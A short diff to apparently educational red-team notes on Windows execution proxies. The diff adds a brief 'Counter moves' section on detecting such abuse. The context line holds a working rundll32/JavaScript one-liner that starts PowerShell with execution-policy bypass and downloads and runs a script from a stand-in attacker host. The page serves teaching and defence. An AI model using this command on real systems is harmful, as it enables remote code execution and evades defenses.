@@ -47,4 +47,6 @@ To run a JavaScript that executes a PowerShell script to download from a remote 
 
     rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
 
+## Counter moves
 
+Built-in execution proxies run a payload under a trusted name. Command-line capture and baselining which binaries ever legitimately spawn what are the counters. The defender's view is in the blue notes on [plausibility as cover](https://blue.tymyrddin.dev/docs/counter/evasion/).
